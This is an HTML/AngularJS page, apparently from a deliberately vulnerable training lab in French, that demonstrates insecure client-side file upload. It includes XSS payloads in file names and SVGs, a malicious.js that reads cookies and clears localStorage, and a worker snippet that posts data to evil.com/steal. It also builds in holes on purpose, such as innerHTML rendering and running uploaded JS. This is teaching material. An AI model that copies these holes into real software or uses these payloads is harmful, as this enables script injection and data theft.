<div class="panel panel-danger">
    <div class="panel-heading">
        <h2>File Upload Non S√©curis√© (AngularJS)</h2>
    </div>
    <div class="panel-body">
        
        <!-- Section 1: Upload de Base -->
        <div class="well">
            <h3>1. Upload Sans Validation</h3>
            <input type="file" onchange="angular.element(this).scope().handleFileUpload(this.files)" 
                   accept="*/*" class="form-control">
            <p>Nom du fichier: <span ng-bind="fileName"></span></p>
            <p class="text-danger">Accepte TOUS les types de fichiers!</p>
            
            <div class="alert alert-info">
                <strong>üí° Pour tester :</strong>
                <ol>
                    <li>Cr√©ez un fichier <code>test.html</code> avec : <code>&lt;script&gt;alert('Fichier ex√©cut√©!')&lt;/script&gt;</code></li>
                    <li>Uploadez-le</li>
                    <li>Le contenu sera affich√© dans la section 4</li>
                    <li>Essayez aussi : .js, .svg, .php, .exe - tout passe !</li>
                </ol>
            </div>
        </div>

        <!-- Section 2: Stockage c√¥t√© client -->
        <div class="well">
            <h3>2. Stockage de Fichiers dans le Navigateur</h3>
            <button ng-click="storeFileInBrowser()" class="btn btn-danger">
                Stocker dans localStorage
            </button>
            <p class="text-danger">
                Stocker des fichiers dans localStorage = probl√®mes de s√©curit√© et performance!
            </p>
            <ul>
                <li>Limite de 5-10MB selon le navigateur</li>
                <li>Donn√©es accessibles via XSS</li>
                <li>Pas de chiffrement</li>
            </ul>
            
            <div class="alert alert-info">
                <strong>üí° Pour tester :</strong>
                <ol>
                    <li>Uploadez un fichier (section 1)</li>
                    <li>Cliquez "Stocker dans localStorage"</li>
                    <li>DevTools ‚Üí Application ‚Üí Local Storage</li>
                    <li>Cherchez <code>uploadedFile_*</code></li>
                    <li>Le fichier entier est stock√© en clair !</li>
                </ol>
            </div>
        </div>

        <!-- Section 3: Affichage du Nom -->
        <div class="well">
            <h3>3. XSS via Nom de Fichier</h3>
            <input type="text" ng-model="fileName" class="form-control" 
                   placeholder='Nom malveillant (ex: <img src=x onerror=alert(1)>.pdf)'>
            <button ng-click="processFileName()" class="btn btn-danger">
                Afficher Nom
            </button>
            <div id="filename-display" class="output"></div>
            <div id="file-link" class="output"></div>
            
            <div class="alert alert-info">
                <strong>üí° Noms de fichiers malveillants :</strong>
                <ul>
                    <li><code>&lt;img src=x onerror=alert('Filename XSS')&gt;.pdf</code></li>
                    <li><code>&lt;svg onload=alert(document.domain)&gt;.doc</code></li>
                    <li><code>&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;.txt</code></li>
                    <li><code>"><script>alert('XSS')</script>.jpg</code></li>
                </ul>
            </div>
        </div>

        <!-- Section 4: Preview du Contenu -->
        <div class="well">
            <h3>4. Preview du Contenu (HTML/JS)</h3>
            <div id="file-preview" class="output" style="border: 2px dashed red; padding: 10px;">
                <!-- Le contenu du fichier sera affich√© ici avec innerHTML -->
            </div>
            <textarea ng-model="fileContent" class="form-control" rows="4" 
                      placeholder="Contenu du fichier upload√©"></textarea>
            <button ng-click="previewHTML()" class="btn btn-danger">Preview HTML</button>
            
            <div class="alert alert-info">
                <strong>üí° Pour tester :</strong>
                <ul>
                    <li>Contenu malveillant : <code>&lt;img src=x onerror="alert('Preview XSS')"&gt;</code></li>
                    <li>JavaScript : <code>&lt;script&gt;document.body.style.background='red'&lt;/script&gt;</code></li>
                    <li>Redirection : <code>&lt;meta http-equiv="refresh" content="0;url=http://evil.com"&gt;</code></li>
                </ul>
                <strong>Ou cr√©ez un fichier .html malveillant et uploadez-le !</strong>
            </div>
        </div>

        <!-- Section 5: Preview iFrame -->
        <div class="well">
            <h3>5. Preview dans iFrame</h3>
            <div id="html-preview"></div>
            <iframe id="preview-iframe" style="width:100%; height:200px; border:1px solid #ccc;">
            </iframe>
            <p class="text-danger">L'iframe ex√©cute le contenu upload√©!</p>
            
            <div class="alert alert-info">
                <strong>üí° Pour tester :</strong>
                <p>L'iframe utilise <code>srcdoc</code> qui ex√©cute le HTML/JS !</p>
                <pre>&lt;script&gt;
  alert('Ex√©cut√© dans iframe!');
  // Acc√®s au parent possible :
  window.parent.document.body.style.background = 'yellow';
&lt;/script&gt;</pre>
            </div>
        </div>

        <!-- Section 6: Upload Large Files -->
        <div class="well">
            <h3>6. Upload Sans Limite de Taille</h3>
            <input type="file" onchange="angular.element(this).scope().uploadLargeFile(this.files[0])" 
                   class="form-control">
            <p class="text-danger">Aucune limite de taille = DoS potentiel!</p>
            
            <div class="alert alert-info">
                <strong>üí° Impact :</strong>
                <ul>
                    <li>Fichier de 100MB ‚Üí Freeze du navigateur</li>
                    <li>Fichier de 1GB ‚Üí Crash possible</li>
                    <li>Remplissage localStorage ‚Üí Quota d√©pass√©</li>
                    <li>CPU √† 100% pendant le traitement</li>
                </ul>
            </div>
        </div>

        <!-- Section 7: Blob URLs -->
        <div class="well">
            <h3>7. Cr√©ation de Blob URLs Sans Cleanup</h3>
            <input type="file" onchange="angular.element(this).scope().createBlobURL(this.files[0])" 
                   class="form-control">
            <a id="blob-link" href="#" target="_blank">Lien Blob cr√©√©</a>
            <p class="text-danger">
                URL.createObjectURL() sans URL.revokeObjectURL() = fuite m√©moire!
            </p>
            
            <div class="alert alert-info">
                <strong>üí° Pour voir la fuite :</strong>
                <ol>
                    <li>Uploadez plusieurs fichiers</li>
                    <li>Ouvrez DevTools ‚Üí Memory</li>
                    <li>Prenez un snapshot</li>
                    <li>Cherchez "Blob" ‚Üí La m√©moire augmente !</li>
                    <li>Les URLs ne sont jamais lib√©r√©es</li>
                </ol>
            </div>
        </div>

        <!-- Section 8: FileReader Synchrone -->
        <div class="well">
            <h3>8. FileReader sur Gros Fichiers (UI Freeze)</h3>
            <input type="file" onchange="angular.element(this).scope().readLargeFileSync(this.files[0])" 
                   class="form-control">
            <p class="text-warning">
                Lire de gros fichiers avec FileReader peut bloquer l'UI!
            </p>
            
            <div class="alert alert-info">
                <strong>üí° Pour tester le freeze :</strong>
                <ul>
                    <li>Uploadez un fichier > 10MB</li>
                    <li>L'UI devient non-responsive</li>
                    <li>Impossible de cliquer ou scroller</li>
                    <li>Le traitement bloque le thread principal</li>
                </ul>
            </div>
        </div>

        <!-- Section 9: SVG Upload -->
        <div class="well">
            <h3>9. Upload SVG avec Scripts</h3>
            <textarea ng-model="svgContent" class="form-control" rows="3" 
                      placeholder='<svg><script>alert("XSS in SVG")</script></svg>'></textarea>
            <button ng-click="uploadSVG(svgContent)" class="btn btn-danger">
                Upload SVG
            </button>
            <div id="svg-container" class="output"></div>
            
            <div class="alert alert-info">
                <strong>üí° SVG malveillants √† tester :</strong>
                <pre>&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
  &lt;script&gt;alert('SVG XSS')&lt;/script&gt;
&lt;/svg&gt;

&lt;svg onload="alert('SVG onload')"&gt;&lt;/svg&gt;

&lt;svg&gt;
  &lt;foreignObject&gt;
    &lt;iframe src="javascript:alert('SVG iframe')"&gt;&lt;/iframe&gt;
  &lt;/foreignObject&gt;
&lt;/svg&gt;</pre>
            </div>
        </div>

        <!-- Section 10: Ex√©cution de JavaScript Upload√© -->
        <div class="well">
            <h3>10. Ex√©cution de Fichiers JavaScript</h3>
            <button ng-click="executeUploadedJS()" class="btn btn-danger" 
                    ng-show="fileName.endsWith('.js')">
                Ex√©cuter le JS Upload√©
            </button>
            <p class="text-danger">
                Ex√©cuter du JavaScript upload√© par l'utilisateur = RCE c√¥t√© client!
            </p>
            
            <div class="alert alert-info">
                <strong>üí° Pour tester :</strong>
                <ol>
                    <li>Cr√©ez un fichier <code>malicious.js</code> :</li>
                    <pre>alert('JS ex√©cut√© !');
document.body.innerHTML = '&lt;h1&gt;Pwned!&lt;/h1&gt;';
console.log(document.cookie);
localStorage.clear(); // Destruction !</pre>
                    <li>Uploadez-le</li>
                    <li>Le bouton "Ex√©cuter" appara√Æt</li>
                    <li>üí• Code arbitraire ex√©cut√© !</li>
                </ol>
            </div>
        </div>

        <!-- Section 11: Web Workers -->
        <div class="well">
            <h3>11. Cr√©ation de Web Workers depuis Fichiers</h3>
            <button ng-click="createWorkerFromFile()" class="btn btn-danger">
                Cr√©er Worker depuis Fichier
            </button>
            <p class="text-warning">
                Workers cr√©√©s sans validation peuvent ex√©cuter du code malveillant!
            </p>
            
            <div class="alert alert-info">
                <strong>üí° Worker malveillant :</strong>
                <pre>// worker.js malveillant
while(true) {
  // Boucle infinie = CPU √† 100%
}

// Ou vol de donn√©es :
self.addEventListener('message', function(e) {
  // Envoie des donn√©es au serveur attaquant
  fetch('http://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify(e.data)
  });
});</pre>
            </div>
        </div>

        <!-- Indicateurs de Vuln√©rabilit√©s -->
        <div class="alert alert-danger">
            <h4>üö® Vuln√©rabilit√©s Actives:</h4>
            <ul>
                <li>Pas de validation de contenu c√¥t√© client</li>
                <li>XSS via noms de fichiers</li>
                <li>Ex√©cution directe de HTML/JavaScript upload√©</li>
                <li>Stockage de fichiers dans localStorage</li>
                <li>Pas de limite de taille c√¥t√© client</li>
                <li>Blob URLs non r√©voqu√©es (fuites m√©moire)</li>
                <li>SVG avec scripts accept√©s</li>
                <li>FileReader bloquant sur gros fichiers</li>
            </ul>
            
            <strong>Bonnes pratiques :</strong>
            <ul>
                <li>‚úÖ Valider les types MIME</li>
                <li>‚úÖ Limiter la taille des fichiers</li>
                <li>‚úÖ Nettoyer les noms de fichiers</li>
                <li>‚úÖ Ne jamais ex√©cuter le contenu upload√©</li>
                <li>‚úÖ Utiliser des Web Workers avec du code valid√© uniquement</li>
                <li>‚úÖ Toujours r√©voquer les Blob URLs</li>
            </ul>
        </div>

    </div>
</div>